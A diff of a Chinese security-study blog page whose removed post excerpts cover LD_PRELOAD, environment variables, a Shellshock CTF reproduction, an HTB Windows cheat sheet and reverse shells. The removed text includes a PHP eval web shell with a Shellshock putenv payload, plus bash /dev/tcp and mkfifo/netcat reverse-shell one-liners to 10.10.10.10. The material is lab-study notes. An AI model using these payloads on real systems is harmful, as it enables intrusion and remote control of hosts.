@@ -219,7 +219,6 @@
     <div class="excerpt">
         <div class="content" v-pre>
             
-            
             <h1 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h1><p>参考资料：（侵删）</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/haoel/article/details/1602108"><strong>警惕UNIX下的LD_PRELOAD环境变量</strong></a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/itworld123/article/details/125755603?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167117754716782390528530%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167117754716782390528530&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-125755603-null-null.142%5Ev68%5Epc_new_rank,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&utm_term=LD_PRELOAD&spm=1018.2226.3001.4187"><strong>深入分析 LD_PRELOAD</strong></a></p>
@@ -227,103 +226,7 @@
 <p>LD_PRELOAD 是 Linux&#x2F;Unix 系统的一个环境变量，它影响程序的运行时的链接（Runtime linker），&#x3D;&#x3D;它允许在程序运行前定义优先加载的动态链接库。&#x3D;&#x3D;这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，&#x3D;&#x3D;我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。&#x3D;&#x3D;</p>
 <pre><code>一般来说，程序的链接分为静态链接和动态链接，静态链接就是把所有所引用到的函数或变量全部地编译到可执行文件中。动态链接则不会把函数编译到可执行文件中，而是在程序运行时动态地载入函数库，也就是运行链接。所以，对于动态链接来说，必然需要一个动态链接库。动态链接库的好处在于，一旦动态库中的函数发生变化，对于可执行程序来说是透明的，可执行程序无需重新编译。这对于程序的发布、维护、更新起到了积极的作用。对于静态链接的程序来说，函数库中一个小小的改动需要整个程序的重新编译、发布，对于程序的维护产生了比较大的工作量。
 </code></pre>
-<p>在这里，我们细分一下程序的连接：</p>
-<pre><code>程序的链接可以分为以下三种
-
-静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。
-装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。
-运行时动态链接：原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。
-</code></pre>
-<p>&#x3D;&#x3D;<strong>动态链接库的 搜索路径搜索的先后顺序</strong>&#x3D;&#x3D;</p>
-<pre><code>编译目标代码时指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）；
-* 环境变量 LD_LIBRARY_PATH 指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）；
-* 配置文件 /etc/ld.so.conf 中指定的动态库搜索路径（可指定多个搜索路径，按照先后顺序依次搜索）；
-* 默认的动态库搜索路径 /lib；
-* 默认的动态库搜索路径 /usr/lib；
-总结：LD_PRELOAD &gt; LD_LIBRARY_PATH &gt; /etc/ld.so.cache &gt; /lib &gt; /usr/lib
-</code></pre>
-<p><strong>零散的知识点</strong></p>
-<pre><code>Linux规定动态链接库的文件名规则比如如下：
-
-libname.so.x.y.z
-
-lib：统一前缀。
-so：统一后缀。
-name：库名，如 libstdc++.so.6.0.21 的 name 就是 stdc++。
-x： 主版本号 。表示库有重大升级，不同主版本号的库之间是不兼容的。如libstdc++.so.6.0.21 的主版本号是 6。
-y： 次版本号 。表示库的增量升级，如增加一些新的接口。在主版本号相同的情况下， 高的次版本号向后兼容低的次版本号 。如 libstdc++.so.6.0.21 的次版本号是 0 。
-z： 发布版本号 。表示库的优化、bugfix等。相同的主次版本号，不同的发布版本号的库之间 完全兼容 。如 libstdc++.so.6.0.21 的发布版本号是 21。
-</code></pre>
-<pre><code>不过可以发现，这里我们要利用的环境变量 LD_PRELOAD 并没有出现在这里的搜索路径之中，反而出现了一个 LD_LIBRARY_PATH，这里关于二者之间的关系和区别在 stackoverflow 上也有大佬讨论，观点也很多，不过在这里我比较认可的是下面这个观点
-
-LD_PRELOAD (not LD_PRELOAD_PATH) 是要在任何其他库之前加载的特定库 ( files ) 的列表，无论程序是否需要。LD_LIBRARY_PATH 是在加载无论如何都会加载的库时要搜索的 目录列表。 在 linux 上，您可以阅读 man ld.so 有关这些和其他影响动态链接器的环境变量的更多信息。
-
-可见，这里 LD_PRELOAD 甚至超脱于动态链接库的搜索路径先后顺序之外，它可以指定在程序运行前优先加载的动态链接库
-</code></pre>
-<h2 id="环境变量-1"><a href="#环境变量-1" class="headerlink" title="环境变量"></a>环境变量</h2><p>参考文章：（侵删）</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_56916549/article/details/127140089?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167117926216800182736496%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167117926216800182736496&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-127140089-null-null.142%5Ev68%5Epc_new_rank,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&utm_term=%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&spm=1018.2226.3001.4187">环境变量</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zzoeey/article/details/77697219?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167101150516782425613659%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167101150516782425613659&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-77697219-null-null.142%5Ev68%5Epc_new_rank,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&utm_term=linux%20env%E5%91%BD%E4%BB%A4&spm=1018.2226.3001.4187">中兴新支点命令篇-环境变量命令</a></p>
-<p>####什么是环境变量</p>
-<blockquote>
-<p>环境变量是指在操作系统中用来指定操作系统运行的一些参数：也就是说，操作系统通过环境变量来找到运行时的一些资源。例如链接的时候帮助链接器找到<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8A%A8%E6%80%81%E5%BA%93&spm=1001.2101.3001.7020">动态库</a>（标准库）或者是执行命令的时候，帮助用户找到命令的位置。</p>
-</blockquote>
-<p>NewStart桌面操作系统中常用的环境变量有 PATH、HOME、LOGNAME等。</p>
-<blockquote>
-<p>l PATH指定命令的搜索路径；</p>
-<p>l HOME 指定的是当前用户主目录；</p>
-<p>l LOGNAME指定的是当前用户的登录名；</p>
-<p>提示：除了以上常见的环境变量，部分应用程序在安装时也需要增加环境变量才能生效，比如Java使用的环境变量：JAVA_HOME 和 CLASSPATH等。</p>
-</blockquote>
-<hr>
-<h2 id="title-环境变量命令date-2023-06-11-23-32-02tags-靶场学习"><a href="#title-环境变量命令date-2023-06-11-23-32-02tags-靶场学习" class="headerlink" title="title: 环境变量命令date: 2023-06-11 23:32:02tags: 靶场学习"></a>title: 环境变量命令<br>date: 2023-06-11 23:32:02<br>tags: 靶场学习</h2><h4 id="环境变量命令"><a href="#环境变量命令" class="headerlink" title="环境变量命令"></a>环境变量命令</h4><blockquote>
-<ul>
-<li><strong>env命令</strong></li>
-</ul>
-<p> 显示所有的环境变量，执行env 命令。</p>
-<ul>
-<li><strong>export命令</strong></li>
-</ul>
-<p>  export 命令用于设置或显示环境变量，在shell 中执行程序时，提供一组环境变量。export 可以新增，修改或删除环境变量，作为后续执行的程序使用。</p>
-<p>  export [-fnp][变量名称]&#x3D;[变量设置值]</p>
-<p>  命令选项：</p>
-<ul>
-<li>-f代表[变量名称]中为函数名称。 </li>
-<li>-n删除指定的变量。变量实际上并未删除，只是不会输出到后续指令的执行环境中。 </li>
-<li>-p列出所有的shell赋予程序的环境变量。</li>
-</ul>
-<p>  ​</p>
-<p>  export 环境变量名称&#x3D;$[环境变量名称]：[新添加的环境变量的内容]:</p>
-<ul>
-<li><p>如果直接赋值，将直接修改变量</p>
-</li>
-<li><p>按   export 环境变量名称&#x3D;$[环境变量名称]：[新添加的环境变量的内容]   将新值添加到末尾</p>
-<p><img src="https://gitee.com/tanin7/knowledge-point-record/raw/master/%E5%9B%BE%E7%89%87/1.png" alt="233.png"></p>
-</li>
-</ul>
-<p>  ​</p>
-</blockquote>
-<p><strong>path命令</strong></p>
-<pre><code>path 决定了 shell 将到哪些目录中寻找命令或程序，path的值是一系列目录，当用户运行一个程序时，系统会在这些目录下进行搜寻编译链接。
-
-PATH=$PATH:&lt;PATH1&gt;:&lt;PATH2&gt;:------:&lt;PATHN&gt;
-
-可以用户添加指定的路径，中间用冒号隔开。
-
-1．安装一个新的命令在 /usr/local/apache/bin 目录下。
-
-2．通过修改.bashrc文件来设置环境变量，赋予某个用户权限使用此环境变量。
-
-3．在终端界面,执行 vi 命令 在 .bashrc文件末尾加入 
-
-export PATH=$PATH:/usr/local/apache/bin 命令。
-
-4．保存并退出文件，执行 source .bashrc 命令让其环境变量生效。
-
-5．如果要让所有用户可用这个环境变量，则以上第2、3步的修改和生效文件由.bashrc改为/etc/profile。
-
-提示：如果 环 境 变 量作 为 临 时 使用 ， 还可 以 直 接 在终 端 界 面 上直 接 执 行 export PATH=$PATH:/usr/local/apache/bin 命令。
-</code></pre>
-
+            
             
         </div>
     </div>
@@ -373,7 +276,6 @@ export PATH=$PATH:/usr/local/apache/bin 命令。
     <div class="excerpt">
         <div class="content" v-pre>
             
-            
             <h1 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/35579956">什么是shellshock攻击：</a></p>
 <p>​	背景：环境变量和bash</p>
 <p>​	</p>
@@ -391,28 +293,7 @@ this is a test
 <p><code>env</code>可以创建临时环境变量.</p>
 <p><code>bash -c</code>可以运行一个shell命令.</p>
 <p>当shell返回“vulnerable”时说明函数申明后的echo函数被执行（漏洞是因为Bash初始化时调用了<code>builtins/evalstring.c</code>里的<code>parse_and_execute//类似于eval</code>函数。）</p>
-<p>原理:</p>
-<p>Shellshock的原理是利用了Bash在导入环境变量函数时候的漏洞,&#x3D;&#x3D;启动Bash的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行。&#x3D;&#x3D;</p>
-<p>在有些CGI脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用Shellshock漏洞的机会。</p>
-<p>HTTP协议的头User-Agent通常是通过环境变量<code>HTTP_USER_AGENT</code>来传递的。</p>
-<p>复现：CTFHUB</p>
-<p><img src="/./233.png" alt="23.png"></p>
-<p>C:\Users\Administrator\Desktop</p>
-<p>上传代码并访问：shell.php</p>
-<pre><code>&lt;?php
-  @eval($_REQUEST[&#39;ant&#39;]);
-  putenv(&quot;PHP_test=() &#123; :; &#125;; tac /flag &gt;&gt; /var/www/html/test.php&quot;);
-  error_log(&quot;admin&quot;,1);
-  //mail(&quot;admin@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
-?&gt;
-</code></pre>
-<p>通过<code>putenv</code>来设置环境变量，默认<code>putenv</code>定义的环境变量名必须以PHP_开头。</p>
-<pre><code>当前用户的环境变量配置文件主要有.bashrc和.profile，~/.profile可以设定本用户专有的路径、环境变量等，它只能登入的时候执行一次；~/.bashrc也是某用户专有设定文档，可以设定路径，命令别名，每次shell脚本的执行都会使用它一次。简单的说，.profile只在会话开始时被读取一次，而.bashrc则每次打开新的终端时，都会被读取。
-</code></pre>
-<p>由上可知想要变量被执行我们需要启动一次shell。</p>
-<p>我们通过putenv函数设置环境变量后执行一个error_log()函数会在执行sh -c -t -i触发payload。</p>
-<p>根据代码在test.php中可以读取到flag。</p>
-
+            
             
         </div>
     </div>
@@ -426,7 +307,7 @@ this is a test
         
         <span class="tag">
             
-            <a href="/tags/靶场学习" style=color:#ff7d73>
+            <a href="/tags/靶场学习" style=color:#00bcd4>
                 靶场学习
             </a>
         </span>
@@ -462,188 +343,8 @@ this is a test
     <div class="excerpt">
         <div class="content" v-pre>
             
-            
             <h4 id="远程桌面协议-（RDP）"><a href="#远程桌面协议-（RDP）" class="headerlink" title="远程桌面协议 （RDP）"></a>远程桌面协议 （RDP）</h4><p>RDP 使用客户端&#x2F;服务器体系结构，其中客户端应用程序用于通过启用了 RDP 访问的网络指定计算机的目标 IP 地址或主机名。启用了 RDP 远程访问的目标计算机被视为服务器。请务必注意，RDP 默认侦听逻辑端口。请记住，IP 地址用作网络上计算机的逻辑标识符，逻辑端口是分配给应用程序的标识符。简单来说，我们可以将网络子网视为城镇中的街道（公司网络），该子网中的 IP 地址分配给主机作为该街道上的房屋，逻辑端口视为可用于访问房屋的窗口&#x2F;门。<code>3389</code></p>
-<p>一旦请求（封装在数据包中）通过其 IP 地址到达目标计算机，请求将根据该请求中指定的端口（作为数据包中的标头包含在内）定向到计算机上托管的应用程序。IP 寻址和协议封装在<a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/details/34">网络简介</a>模块中有更详细的介绍。从网络的角度来看，在本模块中，我们只需要了解每台计算机都分配了一个 IP 地址以通过网络进行通信，而目标计算机上托管的应用程序会侦听特定的逻辑端口。</p>
-<p>我们可以使用RDP从运行Linux或Windows的攻击主机连接到Windows目标。如果我们从Windows主机连接到Windows目标，则可以使用名为（<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc">mstsc.exe</a>）的内置RDP客户端应用程序。Remote Desktop Connection</p>
-<p>为此，必须在目标 Windows 系统上<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-allow-access">允许</a>远程访问。默认情况下，Windows 操作系统上不允许远程访问。HTB 学院团队已将我们的许多 Windows 目标配置为允许通过 VPN 连接到学院实验室后的 RDP 访问。</p>
-<p>远程桌面连接还允许我们保存连接配置文件。这是 IT 管理员的常见习惯，因为它使连接到远程系统更加方便。</p>
-<p>作为渗透测试人员，我们可以在参与时查找这些保存的远程桌面文件（）中受益。<code>.rdp</code></p>
-<p>存在许多其他远程桌面客户端应用程序，其中的一些应用程序在这篇名为<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-clients">远程桌面客户端</a>的 Microsoft 文章中列出。我们不会在本模块中介绍每个远程桌面客户端应用程序。</p>
-<h4 id="使用-xfreerdp"><a href="#使用-xfreerdp" class="headerlink" title="使用 xfreerdp"></a>使用 xfreerdp</h4><p>从基于 Linux 的攻击主机，我们可以使用名为 <a target="_blank" rel="noopener" href="https://linux.die.net/man/1/xfreerdp">xfreerdp</a> 的工具来远程访问 Windows 目标。您会注意到我们在多个模块中使用 xfreerdp，因为它易于使用、功能集、命令行实用程序和效率。</p>
-<p>使用以下命令通过远程桌面 （RDP） 进行连接：</p>
-<pre><code>Tanin@htb[/htb]$ xfreerdp /v:&lt;targetIp&gt; /u:htb-student /p:Password
-</code></pre>
-<h1 id="Windows-Services-amp-Process"><a href="#Windows-Services-amp-Process" class="headerlink" title="Windows Services &amp; Process"></a>Windows Services &amp; Process</h1><p>服务是 Windows 操作系统的主要组件。它们允许创建和管理长时间运行的进程。Windows 服务可以在系统启动时自动启动，无需用户干预。即使用户在系统上注销其帐户，这些服务也可以继续在后台运行。</p>
-<p>还可以创建应用程序以作为服务安装，例如安装在服务器上的网络监视应用程序。Windows 上的服务负责 Windows 操作系统中的许多功能，例如网络功能、执行系统诊断、管理用户凭据、控制 Windows 更新等。</p>
-<p>Windows 服务通过服务控制管理器 （SCM） 系统进行管理，可通过 MMC 加载项访问。<code>services.msc</code></p>
-<p>此外接程序提供用于与服务交互和管理服务的 GUI 界面，并显示有关每个已安装服务的信息。此信息包括服务名称、说明、状态、启动类型以及运行服务的用户。</p>
-<p>还可以使用 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7">PowerShell</a> cmdlet（如 ）通过命令行查询和管理服务。<code>sc.exe``Get-Service</code></p>
-<h2 id="使用-services-msc-检查服务"><a href="#使用-services-msc-检查服务" class="headerlink" title="使用 services.msc 检查服务"></a>使用 services.msc 检查服务</h2><h2 id="使用-sc-检查服务"><a href="#使用-sc-检查服务" class="headerlink" title="使用 sc 检查服务"></a>使用 sc 检查服务</h2><h2 id="安全标识符-（SID）"><a href="#安全标识符-（SID）" class="headerlink" title="安全标识符 （SID）"></a>安全标识符 （SID）</h2><p>系统上的每个安全主体都有一个唯一的安全标识符 （SID）。系统自动生成 SID。这意味着，例如，即使我们在系统上有两个相同的用户，Windows 也可以根据其 SID 区分两者及其权限。SID 是具有不同长度的字符串值，存储在安全数据库中。这些 SID 将添加到用户的访问令牌中，以标识用户有权执行的所有操作。</p>
-<p>SID 由标识符颁发机构和相对 ID （RID） 组成。在 Active Directory （AD） 域环境中，SID 还包括域 SID。</p>
-<h5 id="备忘单"><a href="#备忘单" class="headerlink" title="备忘单"></a>备忘单</h5><p>备忘单是此模块的有用命令参考。</p>
-<table>
-<thead>
-<tr>
-<th><strong>命令</strong></th>
-<th><strong>描述</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>xfreerdp /v:&lt;target IP address&gt; /u:htb-student /p:&lt;password&gt;</code></td>
-<td>RDP 到实验室目标</td>
-</tr>
-<tr>
-<td><code>Get-WmiObject -Class win32_OperatingSystem</code></td>
-<td>获取有关操作系统的信息</td>
-</tr>
-<tr>
-<td><code>dir c:\ /a</code></td>
-<td>查看 c：\ 中的所有文件和目录根目录</td>
-</tr>
-<tr>
-<td><code>tree &lt;directory&gt;</code></td>
-<td>以图形方式显示路径的目录结构</td>
-</tr>
-<tr>
-<td>&#96;tree c:\ &#x2F;f</td>
-<td>more&#96;</td>
-</tr>
-<tr>
-<td><code>icacls &lt;directory&gt;</code></td>
-<td>查看在目录上设置的权限</td>
-</tr>
-<tr>
-<td><code>icacls c:\users /grant joe:f</code></td>
-<td>授予用户对目录的完全权限</td>
-</tr>
-<tr>
-<td><code>icacls c:\users /remove joe</code></td>
-<td>删除用户对目录的权限</td>
-</tr>
-<tr>
-<td><code>Get-Service</code></td>
-<td><code>PowerShell</code>用于查看正在运行的服务的 cmdlet</td>
-</tr>
-<tr>
-<td><code>help &lt;command&gt;</code></td>
-<td>显示特定命令的帮助菜单</td>
-</tr>
-<tr>
-<td><code>get-alias</code></td>
-<td>列出别名<code>PowerShell</code></td>
-</tr>
-<tr>
-<td><code>New-Alias -Name &quot;Show-Files&quot; Get-ChildItem</code></td>
-<td>创建新别名<code>PowerShell</code></td>
-</tr>
-<tr>
-<td>&#96;Get-Module</td>
-<td>select Name,ExportedCommands</td>
-</tr>
-<tr>
-<td><code>Get-ExecutionPolicy -List</code></td>
-<td>查看执行策略<code>PowerShell</code></td>
-</tr>
-<tr>
-<td><code>Set-ExecutionPolicy Bypass -Scope Process</code></td>
-<td>将当前会话的执行策略设置为绕过<code>PowerShell</code></td>
-</tr>
-<tr>
-<td><code>wmic os list brief</code></td>
-<td>获取有关操作系统的信息<code>wmic</code></td>
-</tr>
-<tr>
-<td><code>Invoke-WmiMethod</code></td>
-<td>调用对象的方法<code>WMI</code></td>
-</tr>
-<tr>
-<td><code>whoami /user</code></td>
-<td>查看当前用户的 SID</td>
-</tr>
-<tr>
-<td><code>reg query &lt;key&gt;</code></td>
-<td>查看有关注册表项的信息</td>
-</tr>
-<tr>
-<td><code>Get-MpComputerStatus</code></td>
-<td>检查启用了哪些保护设置<code>Defender</code></td>
-</tr>
-<tr>
-<td><code>sconfig</code></td>
-<td>Windows Server Core 中的“加载服务器配置”菜单</td>
-</tr>
-</tbody></table>
-<h2 id="完整性控制访问控制列表-（icacls）"><a href="#完整性控制访问控制列表-（icacls）" class="headerlink" title="完整性控制访问控制列表 （icacls）"></a>完整性控制访问控制列表 （icacls）</h2><p>Integrity Control Access Control List</p>
-<p>可以使用安全选项卡下的文件资源管理器 GUI 管理对 Windows 中文件和文件夹的 NTFS 权限。除了 GUI 之外，我们还可以使用 icacls 实用程序从命令行对 Windows 中的 NTFS 文件权限实现精细的粒度。</p>
-<p>我们可以通过从工作目录中运行或针对当前不在的目录运行来列出特定目录上的 NTFS 权限</p>
-<pre><code>C:\htb&gt; icacls c:\windows
-c:\windows NT SERVICE\TrustedInstaller:(F)
-           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
-           NT AUTHORITY\SYSTEM:(M)
-           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
-           BUILTIN\Administrators:(M)
-           BUILTIN\Administrators:(OI)(CI)(IO)(F)
-           BUILTIN\Users:(RX)
-           BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
-           CREATOR OWNER:(OI)(CI)(IO)(F)
-           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
-           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
-           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
-           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
-
-Successfully processed 1 files; Failed processing 0 files
-</code></pre>
-<p>资源访问级别列在输出中的每个用户之后。可能的继承设置包括：</p>
-<ul>
-<li><code>(CI)</code>：容器继承</li>
-<li><code>(OI)</code>：对象继承</li>
-<li><code>(IO)</code>：仅继承</li>
-<li><code>(NP)</code>：不传播继承</li>
-<li><code>(I)</code>：从父容器继承的权限</li>
-</ul>
-<p>在上面的示例中，该帐户具有对象继承、容器继承、仅继承和完全访问权限。这意味着此帐户可以完全控制此目录和子目录中的所有文件系统对象。<code>NT AUTHORITY\SYSTEM</code></p>
-<p>基本访问权限如下：</p>
-<ul>
-<li><code>F</code>：完全访问权限</li>
-<li><code>D</code>：删除访问权限</li>
-<li><code>N</code>：无访问权限</li>
-<li><code>M</code>：修改访问权限</li>
-<li><code>RX</code>：读取和执行访问</li>
-<li><code>R</code>：只读访问</li>
-<li><code>W</code>：只写访问</li>
-</ul>
-<p>我们可以使用 .在这里，我们在本地管理员帐户的上下文中执行，该帐户显示用户没有任何写入权限的目录。<code>icacls``icacls``C:\users``joe</code></p>
-<pre><code>C:\htb&gt; icacls c:\Users
-c:\Users NT AUTHORITY\SYSTEM:(OI)(CI)(F)
-         BUILTIN\Administrators:(OI)(CI)(F)
-         BUILTIN\Users:(RX)
-         BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
-         Everyone:(RX)
-         Everyone:(OI)(CI)(IO)(GR,GE)
-
-Successfully processed 1 files; Failed processing 0 files
-</code></pre>
-<p>使用该命令，我们可以授予 joe 用户对目录的完全控制权，但鉴于该命令中不包含该目录，joe 用户将仅对文件夹拥有权限，而对用户子目录和其中包含的文件没有权限。<code>icacls c:\users /grant joe:f``(oi)``(ci)``c:\users</code></p>
-<pre><code>C:\htb&gt; icacls c:\users /grant joe:f
-processed file: c:\users
-Successfully processed 1 files; Failed processing 0 files
-</code></pre>
-<pre><code>C:\htb&gt; &gt;icacls c:\users
-c:\users WS01\joe:(F)
-         NT AUTHORITY\SYSTEM:(OI)(CI)(F)
-         BUILTIN\Administrators:(OI)(CI)(F)
-         BUILTIN\Users:(RX)
-         BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
-         Everyone:(RX)
-         Everyone:(OI)(CI)(IO)(GR,GE)
-
-Successfully processed 1 files; Failed processing 0 files
-</code></pre>
-<p>可以使用命令撤销这些权限。<code>icacls c:\users /remove joe</code></p>
-<p><code>icacls</code>非常强大，可以在域设置中使用，以授予某些用户或组对文件或文件夹的特定权限、显式拒绝访问、启用或禁用继承权限以及更改目录&#x2F;文件所有权。</p>
-<p>可<a target="_blank" rel="noopener" href="https://ss64.com/nt/icacls.html">在此处</a>找到命令行参数和详细权限设置的完整列表。<code>icacls</code></p>
-
+            
             
         </div>
     </div>
@@ -692,7 +393,6 @@ Successfully processed 1 files; Failed processing 0 files
 
     <div class="excerpt">
         <div class="content" v-pre>
-            
             
             <h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h3 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h3><table>
 <thead>
@@ -758,19 +458,7 @@ Successfully processed 1 files; Failed processing 0 files
 <td>此目录包含可变数据文件，例如日志文件、电子邮件收件箱、Web 应用程序相关文件、cron 文件等。</td>
 </tr>
 </tbody></table>
-<h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><table>
-<thead>
-<tr>
-<th><code>\d</code></th>
-<th>日期（6月&lt;&gt;日星期一）</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>&#96;\D</td>
-<td></td>
-</tr>
-</tbody></table>
-
+            
             
         </div>
     </div>
@@ -784,7 +472,7 @@ Successfully processed 1 files; Failed processing 0 files
         
         <span class="tag">
             
-            <a href="/tags/base" style=color:#00a596>
+            <a href="/tags/base" style=color:#ff7d73>
                 base
             </a>
         </span>
@@ -820,7 +508,6 @@ Successfully processed 1 files; Failed processing 0 files
     <div class="excerpt">
         <div class="content" v-pre>
             
-            
             <h2 id="msf插件"><a href="#msf插件" class="headerlink" title="msf插件"></a>msf插件</h2><table>
 <thead>
 <tr>
@@ -845,7 +532,7 @@ Successfully processed 1 files; Failed processing 0 files
 <td><a target="_blank" rel="noopener" href="https://github.com/darkoperator/Metasploit-Plugins">Darkoperator’s</a></td>
 </tr>
 </tbody></table>
-
+            
             
         </div>
     </div>
@@ -859,7 +546,7 @@ Successfully processed 1 files; Failed processing 0 files
         
         <span class="tag">
             
-            <a href="/tags/base" style=color:#ff7d73>
+            <a href="/tags/base" style=color:#ffa2c4>
                 base
             </a>
         </span>
@@ -894,7 +581,6 @@ Successfully processed 1 files; Failed processing 0 files
 
     <div class="excerpt">
         <div class="content" v-pre>
-            
             
             <p>#初见反弹shell</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md</a></p>
@@ -944,137 +630,7 @@ listening on [any] 1234 ...
 <td>端口号正在侦听，应将反向连接发送到。<code>netcat</code></td>
 </tr>
 </tbody></table>
-<p>##Reverse Shell</p>
-<p>###载荷1：</p>
-<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#39;
-</code></pre>
-<p>在命令行中，<code>bash -c</code> 和 <code>-i</code> 是 <code>bash</code> shell 的选项和参数。</p>
-<ul>
-<li><code>-c</code> 选项用于在命令行上执行指定的命令。它允许您在不启动新的交互式 <code>bash</code> 会话的情况下执行一条命令。后面应跟随要执行的命令。例如，<code>bash -c &#39;echo Hello, World!&#39;</code> 将执行 <code>echo Hello, World!</code> 这个命令，并在输出中打印 “Hello, World!”。</li>
-<li><code>-i</code> 参数是交互式模式的意思。它使 <code>bash</code> shell 在启动后成为交互式的，以便用户可以与 shell 进行交互。通常在需要与 shell 进行交互的脚本或命令中使用 <code>-i</code> 参数。例如，<code>bash -i</code> 将启动一个交互式 <code>bash</code> shell。</li>
-</ul>
-<p>在提供的命令中，<code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#123;ip&#125; 0&gt;&amp;1&#39;</code> 结合了这两个选项和参数。它使用 <code>-c</code> 选项来执行指定的命令，而该命令是 <code>bash -i &gt;&amp; /dev/tcp/&#123;ip&#125; 0&gt;&amp;1</code>。这将启动一个交互式 <code>bash</code> shell，并将其标准输出（文件描述符 1）重定向到 <code>/dev/tcp/&#123;ip&#125;</code>，并将标准输入（文件描述符 0）重定向到标准输出。这种配置通常用于建立反向 shell 连接。请注意，<code>&#123;ip&#125;</code> 应该被替换为实际的 IP 地址。</p>
-<h2 id="Bind-Shell"><a href="#Bind-Shell" class="headerlink" title="Bind Shell"></a>Bind Shell</h2><p>###载荷2：</p>
-<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f
-</code></pre>
-<p>提供的命令涉及一系列操作，包括创建命名管道（named pipe），使用<code>cat</code>命令将管道的输出传递给<code>/bin/sh</code>并建立反向 shell 连接。</p>
-<p>具体来说，这个命令的含义如下：</p>
-<ol>
-<li><code>rm /tmp/f</code>: 删除 <code>/tmp/f</code> 文件（如果存在）。</li>
-<li><code>mkfifo /tmp/f</code>: 创建一个命名管道文件 <code>/tmp/f</code>。</li>
-<li><code>cat /tmp/f | /bin/sh -i 2&gt;&amp;1</code>: 使用<code>cat</code>命令读取管道 <code>/tmp/f</code> 的内容，并将其传递给<code>/bin/sh</code>来执行，<code>-i</code>选项表示以交互式方式运行 shell。</li>
-<li><code>nc 10.10.10.10 1234 &gt;/tmp/f</code>: 使用<code>nc</code>命令（netcat）建立到 <code>10.10.10.10</code> IP 地址、端口 <code>1234</code> 的反向 shell 连接，并将连接的输入输出重定向到管道 <code>/tmp/f</code>。</li>
-</ol>
-<p>总体上，这个命令的目的是在本地主机上建立一个反向 shell 连接，将输入输出流通过命名管道 <code>/tmp/f</code> 传输，并通过<code>nc</code>命令将流重定向到远程主机 <code>10.10.10.10</code> 的端口 <code>1234</code> 上。</p>
-<h4 id="什么是管道文件："><a href="#什么是管道文件：" class="headerlink" title="什么是管道文件："></a>什么是管道文件：</h4><p>管道文件（Named pipe）是一种特殊类型的文件，它允许不同进程之间通过文件系统进行通信。它提供了一个双向的、先进先出（FIFO）的通信通道，允许一个进程将数据写入管道的一端，而另一个进程可以从管道的另一端读取相同的数据。</p>
